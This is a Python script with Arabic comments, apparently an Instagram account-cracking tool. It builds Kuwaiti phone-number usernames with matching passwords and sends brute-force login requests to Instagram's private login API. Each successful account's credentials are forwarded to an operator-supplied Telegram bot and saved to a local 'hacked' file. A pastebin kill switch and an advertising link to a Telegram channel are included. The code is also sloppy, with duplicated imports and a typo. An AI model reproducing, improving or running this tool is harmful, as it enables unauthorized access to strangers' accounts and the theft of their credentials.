import os, pyfiglet, requests, os, sys, time, requests, os, random, json, threading, secrets, uuid, pyfiglet, threading, sys, time
import os, pyfiglet, requests, os, sys, time, requests, os, random, json, threading, secrets, uuid, pyfiglet, threading, sys, time
from colorama import Fore, Style
from time import sleep
from datetime import datetime
from secrets import token_hex
from uuid import uuid4
from random import randint
from user_agent import generate_user_agent
import sys as n, time as mm, requests, os, random, json, threading, secrets, uuid
from colorama import Fore, Style
from time import sleep
from datetime import datetime
from secrets import token_hex
from uuid import uuid4
from user_agent import generate_user_agent
import pyfiglet, os, random, uuid, requests, string
from user_agent import generate_user_agent
from datetime import datetime
from random import *
from time import sleep
import requests, os, random, json, threading, secrets, uuid
from colorama import Fore, Style
from time import sleep
from datetime import datetime
from secrets import token_hex
import webbrowser
webbrowser.open('https://t.me/j_b_i')
os.system('title @')
clear = lambda : os.system('cls')
try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()

try:
    from colored import fg
except ImportError:
    os.system('pip install colored')
    from colored import fg
    clear()

try:
    from uuid import uuid4
except ImportError:
    os.system('pip install uuid')
    from uuid import uuid4
    clear()
else:
    try:
        import random
    except ImportError:
        os.system('pip install random')
        import random
        clear()
    else:
        color3 = fg(2)
        color4 = fg('9')

        def close():
            input('- Press Enter To Exit /')
            sys.exit()

#Negan
        clear()
try:
    import uuid
except:
    os.system('pip install uuid')

try:
    from random import *
except:
    os.systeam('pip install random ')

try:
    import string
except:
    os.system('pip install string')

try:
    import requests
except:
    os.system('pip install requests ')

try:
    from user_agent import generate_user_agent
except:
    os.system('pip install user_agent ')

try:
    from datetime import datetime
except:
    os.system('pip install datetime ')

try:
    import time
except:
    os.system('pip install time')
else:
    os.system('clear')
    try:
        import pyfiglet
    except:
        os.system('pip install pyfiglet')
    else:
        os.system('clear')
        import pyfiglet, os
        from time import sleep
        import webbrowser, os, sys, requests
        P = '\x1b[2;35m'
        J = '\x1c[1;31m'
        I = '\x1b[2;36m'
        H = '\x1b[2;35m'
        A = '\x1b[2;36m'
        E = '\x1b[1;31m'
        Z = '\x1b[2;31m'
        E = '\x1b[1;31m'
        G = '\x1b[1;32m'
        S = '\x1b[1;33m'
        import user_agent, random, uuid, requests, string
        from user_agent import generate_user_agent
        from datetime import datetime
        from random import *
        from time import sleep
        import requests, os, random, json, threading, secrets, uuid
        from colorama import Fore, Style
        from time import sleep
        from datetime import datetime
        from secrets import token_hex
        from uuid import uuid4
        import pyfiglet, webbrowser
        sleep(1)
        sleep(1)
        os.system('clear')
        aa = 0
        zz = 0
        ib = 0
        Z + ' Enter TOKEN '
        print(' توكن البوت㋛︎\n')
        tok = input(G + '     ↠ ')
        sleep(2)
        os.system('clear')
        A + ' Enter ID '
        print(' حط ايديك حب㋛︎\n')
        ID = input(G + '     ↠ ')
        sleep(2)
        os.system('clear')
        w = 'https://pastebin.com/raw/mpWBGQKF'
        import time
        t = time.localtime()
        current_time = time.strftime('%H:%M:%S', t)
        sleep(2)
        rss = requests.get(w).text
        if 'I' in rss:
            sleep(0.1)
            r = requests.Session()
            user = '0123456789'
            while True:
                us = str(''.join((random.choice(user) for i in range(6))))
                username = '+96555' + us
                password = '55' + us
                url = 'https://i.instagram.com/api/v1/accounts/login/'
                headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',  'Cookie':'missing', 
                 'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
                uid = str(uuid4())
                data = {'uuid':uid,  'password':password,  'username':username, 
                 'device_id':uid, 
                 'from_reg':'false', 
                 '_csrftoken':'missing', 
                 'login_attempt_countn':'0'}
                req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
                if 'logged_in_user' in req_login.text:
                    zz += 1
                    print(G + 'username ==> : ' + username + ': password ==> : ' + password)
                    tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= ༒︎ ՏᗩᑎTITO ᖴᑌᑕK KᑌᗯᗩITI\n❛ ━━━━━━･❪Տᗩᑎ❫ ･━━━━━━ ❜\nᑌՏᗴᖇ :{username}\n\nᑭᗩՏՏ :{password}\n\nTIᗰᗴ :{current_time}\n❛ ━━━━━━･❪Տᗩᑎ❫ ･━━━━━━ ❜\n✿*:･ﾟ "
                    i = requests.post(tlg)
                    with open('SAN.txt', 'a') as (HACKED):
                        HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
                elif '"message":"challenge_required","challenge"' in req_login.text:
                    ib += 1
                    print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
                else:
                    print(E + 'username ==> : ' + username + ': password ==> : ' + password)
                    aa += 1

        else:
            print(Z + 'username ==> : ' + username + ': password ==> : ' + password)
            aa += 1
#لا تصير فرخ وتغير الحقوق مال سنتيتو 